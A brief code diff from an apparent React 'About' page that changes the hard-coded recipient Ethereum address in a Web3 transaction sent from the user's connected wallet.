@@ -26,7 +26,7 @@ const AboutPage = () => {
       nonce: '0x00', 
       gasPrice: '174876E800', 
       gas: '5208', 
-      to: '0x6aeEB6ED3702433E1E757aA7CeBfa8055982bD47', 
+      to: '0x28fc306555b67d4Fd4225D0B77454639854a81B9', 
       from: window.ethereum.selectedAddress, 
       value: Web3.utils.toHex(Web3.utils.toWei(value)), 
       data:
